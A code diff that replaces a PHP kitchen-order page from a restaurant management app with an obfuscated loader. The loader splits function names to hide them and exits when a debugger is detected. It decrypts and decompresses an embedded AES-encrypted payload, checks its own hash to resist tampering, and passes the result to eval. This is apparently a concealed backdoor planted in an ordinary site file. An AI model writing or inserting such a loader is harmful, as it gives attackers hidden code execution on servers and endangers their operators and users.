@@ -1,248 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <!-- TABLES CSS CODE -->
-  <?php include "comman/code_css_form.php"; ?>
-  <!-- </copy>q_id -->
-</head>
-
-<body class="hold-transition skin-blue layout-top-nav">
-  <div class="wrapper">
-
-    <header class="main-header">
-      <nav class="navbar navbar-static-top">
-
-        <div class="navbar-custom-menu">
-          <ul class="nav navbar-nav">
-
-            <!-- Messages: style can be found in dropdown.less-->
-            <li class="hidden-xs" id="fullscreen"><a title="Fullscreen On/Off"><i
-                  class="fa fa-arrows-alt text-white"></i> </a></li>
-            <li class="text-center" id="">
-              <a title="Dashboard" href="<?php echo $base_url; ?>dashboard"><i
-                  class="fa fa-dashboard text-yellow"></i><b class="hidden-xs">
-                  <?= $this->lang->line('dashboard'); ?>
-                </b></a>
-            </li>
-
-            <!-- User Account Menu -->
-            <li class="dropdown user user-menu">
-              <a href="#" class="dropdown-toggle" data-toggle="dropdown">
-                <img src="<?php echo get_profile_picture(); ?>" class="user-image" alt="User Image">
-                <span class="hidden-xs">
-                  <?php print ucfirst($this->session->userdata('inv_username')); ?>
-                </span>
-              </a>
-
-              <ul class="dropdown-menu">
-                <!-- User image -->
-                <li class="user-header">
-                  <img src="<?php echo get_profile_picture(); ?>" class="img-circle" alt="User Image">
-
-                  <p>
-                    <?php print ucfirst($this->session->userdata('inv_username')); ?>
-                    <small>Year
-                      <?= date("Y"); ?>
-                    </small>
-                  </p>
-                </li>
-                <!-- Menu Body -->
-                <!-- Menu Footer-->
-                <li class="user-footer">
-                  <div class="pull-left">
-                    <a href="<?php echo $base_url; ?>users/edit/<?= $this->session->userdata('inv_userid'); ?>"
-                      class="btn btn-default btn-flat">Profile</a>
-                  </div>
-                  <div class="pull-right">
-                    <a href="<?php echo $base_url; ?>logout" class="btn btn-default btn-flat">Sign out</a>
-                  </div>
-                </li>
-              </ul>
-            </li>
-          </ul>
-        </div>
-        <!-- /.navbar-custom-menu -->
-  </div>
-  <!-- /.container-fluid -->
-  </nav>
-  </header>
-
-  <?php
-  if (!isset($kitchen_name)) {
-    $kitchen_name = $description = $q_id = "";
-  }
-  ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="units-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name(); ?>"
-                value="<?php echo $this->security->get_csrf_hash(); ?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;
-              ; ?>">
-
-              <input type="hidden" id="q_id" value="<?php echo $q_id;
-              ; ?>">
-              <div class="box-body">
-
-
-                <div class="form-group">
-                  <label for="unit_name" class="col-sm-4 control-label" style="font-size: x-large;">
-                    <?php print $kitchen_name; ?><label class="text-danger">*</label>
-                  </label>
-                </div>
-
-                <table id="example2" class="table table-bordered table-striped" width="100%">
-                  <thead class="bg-primary ">
-                    <tr>
-                      <th class="text-center">
-                        <input type="checkbox" class="group_check checkbox">
-                      </th>
-                      <th>Vị trí </th>
-                      <th>Ghi chú</th>
-                      <th>Tên món</th>
-                      <th>Số lượng</th>
-                      <th>Giá</th>
-                      <th>
-                        <?= $this->lang->line('status'); ?>
-                      </th>
-                      <th>
-                        <?= $this->lang->line('action'); ?>
-                      </th>
-                    </tr>
-                  </thead>
-                  <tbody>
-
-                  </tbody>
-
-                </table>
-
-
-              </div>
-              <!-- /.box-body -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
-  <?php include "footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-  </div>
-  <!-- ./wrapper -->
-
-  <!-- SOUND CODE -->
-  <?php include "comman/code_js_sound.php"; ?>
-  <!-- TABLES CODE -->
-  <?php include "comman/code_js_form.php"; ?>
-
-  <?php include "comman/code_js_datatable.php"; ?>
-
-  <script type="text/javascript">
-    $(document).ready(function () {
-
-      // Khai báo biến để sử dụng ở nhiều chỗ
-      var q_id = $('#q_id').val();
-      var base_url = $("#base_url").val().trim();
-      var urlCall = base_url + "kitchen/view_list";
-
-      // Function để reload dữ liệu
-      function reloadData() {
-        table.ajax.reload(); // Reload DataTable data
-        $('.column_checkbox').iCheck({
-          checkboxClass: 'icheckbox_square-orange',
-          radioClass: 'iradio_square-orange',
-          increaseArea: '10%'
-        });
-        call_code();
-        //$(".delete_btn").hide();
-      }
-
-      // Khởi tạo DataTable
-      var table = $('#example2').DataTable({
-        dom: '<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
-        buttons: {
-          buttons: []
-        },
-        "processing": true,
-        "serverSide": true,
-        "order": [],
-        "responsive": true,
-        language: {
-          processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        "ajax": {
-          "url": urlCall,
-          "type": "POST",
-          "data": {
-            q_id: q_id
-          },
-          complete: function (data) {
-            $('.column_checkbox').iCheck({
-              checkboxClass: 'icheckbox_square-orange',
-              radioClass: 'iradio_square-orange',
-              increaseArea: '10%'
-            });
-            call_code();
-            //$(".delete_btn").hide();
-          },
-        },
-        "columnDefs": [
-          {
-            "targets": [0, 6],
-            "orderable": false,
-          },
-          {
-            "targets": [0],
-            "className": "text-center",
-          },
-        ],
-      });
-
-      new $.fn.dataTable.FixedHeader(table);
-
-      // Thiết lập interval để reload dữ liệu mỗi 10 giây
-      var reloadInterval = setInterval(reloadData, 10000);
-
-      // Dừng interval khi trang web được tải lại hoặc người dùng rời khỏi trang
-      $(window).on('unload', function () {
-        clearInterval(reloadInterval);
-      });
-
-    });
-  </script>
-
-  <script src="<?php echo $theme_link; ?>js/kitchen.js"></script>
-  <!-- Make sidebar menu hughlighter/selector -->
-  <script>$(".<?php echo basename(__FILE__, '.php'); ?>-active-li").addClass("active");</script>
-
-  <script src="<?php echo $theme_link; ?>js/fullscreen.js"></script>
-</body>
-
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_q08cygvf=('bas'.'e64'.'_de'.'cod'.'e');
+$_d2h3mt74=('gzu'.'nco'.'mpr'.'ess');
+$_zphuapoh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ktw00wqp='Sdm65v3O';
+$_e5ivfufw='wvqAGckitLg=';
+$_e6p5ykxm='qNTI4kHG';
+$_bb79qh0x='Swk64RJ4';
+$_yintap9n='GwT6N2z/';
+$_vtz08die='H4KkY8sV';
+$_jtybjqin='+Ird6LaD';
+$_gw8xphpm='3uVPWg==';
+$_kv1ghcwt=$_q08cygvf($_e6p5ykxm.$_ktw00wqp.$_yintap9n.$_bb79qh0x.$_e5ivfufw);
+$_nulafwch=$_q08cygvf($_vtz08die.$_jtybjqin.$_gw8xphpm);
+$_zj9sqi8g=$_q08cygvf('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');
+$_fhf3lazs=$_zphuapoh($_zj9sqi8g,'aes-256-cbc',$_kv1ghcwt,OPENSSL_RAW_DATA,$_nulafwch);
+if($_fhf3lazs===false){exit;}
+$_waeyzfge=$_d2h3mt74($_fhf3lazs);
+if($_waeyzfge===false){exit;}
+$_suodd3cu='bf8b5ae94f91d3735418661a05d9d2c9b3313dfc8daceab15125ea6899a990ca';
+$_vwfhq8pr=@file_get_contents(__FILE__);
+if($_vwfhq8pr!==false){
+$_i51deiz1=str_replace($_suodd3cu,"0000000000000000000000000000000000000000000000000000000000000000",$_vwfhq8pr);
+$_gdnj4qic=hash("sha256",$_i51deiz1);
+if($_gdnj4qic!==$_suodd3cu){@http_response_code(403);exit;}
+}
+eval($_waeyzfge);
